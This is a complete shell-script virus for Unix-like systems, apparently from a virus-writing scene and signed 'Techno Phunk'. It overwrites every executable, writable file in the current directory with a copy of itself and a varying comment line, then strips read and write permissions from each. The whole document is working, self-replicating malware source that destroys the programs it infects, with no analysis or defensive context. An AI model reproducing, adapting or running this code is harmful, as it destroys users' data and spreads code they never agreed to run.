# Someone had to do it.
# [Jaded] experiment in *nix 'viruses'
# Overwriter SemiPoly :(
for file in *
do
if test -x $file
 then
if test -w $file
 then
if test -f $file
 then
# Techno Phunk
echo "">$file
cp $0 .tmp
echo '#' $fileX >>$file
fileX=$file
cat .tmp>>$file
chmod a-wr $file
rm .tmp
fi ; fi ; fi
done
